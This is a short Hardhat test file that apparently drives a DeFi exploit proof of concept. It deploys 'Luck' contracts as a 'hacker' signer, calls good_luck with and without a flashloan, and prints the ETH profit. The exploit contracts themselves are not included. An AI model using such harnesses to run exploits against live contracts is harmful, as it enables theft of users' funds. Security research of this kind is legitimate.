import { expect } from "chai";
import { defaultAccounts } from "ethereum-waffle";
import { BigNumber, Contract } from "ethers";
import { getAddress, Interface } from "ethers/lib/utils";
import { readFileSync } from "fs";
import { artifacts, ethers } from "hardhat";

describe("Luck", function () {
  const tokens : any[] = [];

  it("exploit by flashloan", async function () {
    const accounts = await ethers.getSigners()
    const hacker = await accounts[0];

    const Luck = await ethers.getContractFactory("LuckF", hacker);
    const luck = await Luck.deploy();

    await luck.deployed();
    await luck.good_luck(tokens, {
      from: hacker.address
    });

    console.log(`profit: ${ethers.utils.formatEther((await luck.provider.getBalance(luck.address)))} ETH`);
  })

  it("exploit without flashloan",async () => {
    const accounts = await ethers.getSigners()
    const hacker = await accounts[0];

    const Luck = await ethers.getContractFactory("Luck", hacker);
    const luck = await Luck.deploy();

    await luck.deployed();
    await luck.good_luck(tokens, {
      from: hacker.address,
      value: ethers.utils.parseEther('1000')
    });
    
    console.log(`profit: ${ethers.utils.formatEther((await luck.provider.getBalance(luck.address)).sub(ethers.utils.parseEther('1000')))} ETH`)
  })
})